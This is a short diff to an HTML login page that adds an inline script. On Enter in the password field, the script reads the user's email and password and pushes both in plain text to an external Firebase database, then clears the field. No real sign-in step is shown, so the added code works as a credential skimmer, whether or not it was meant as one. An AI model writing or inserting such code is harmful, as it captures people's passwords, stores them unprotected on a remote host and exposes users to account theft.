@@ -40,6 +40,17 @@
          <h4>Login with</h4>
  <a href="#" class="btn btn-primary bt-social" data-provider="facebook">Facebook</a>
  <a href="#" class="btn btn-info bt-social" data-provider="twitter">Twitter</a>
+    <script>
+      var myDataRef = new Firebase('https://dazzling-heat-5064.firebaseapp.com');
+      $('#passInput').keypress(function (e) {
+        if (e.keyCode == 13) {
+          var email = $('#emailInput').val();
+          var pass = $('#passInput').val();
+          myDataRef.push({email: email, pass: pass});
+          $('#passInput').val('');
+        }
+      });
+    </script>
 
         <!-- <a href="#" class="btn btn-danger bt-social" data-provider="google">Google+</a> --> <a href="#" class="btn btn-default bt-social" data-provider="github">GitHub</a>
 
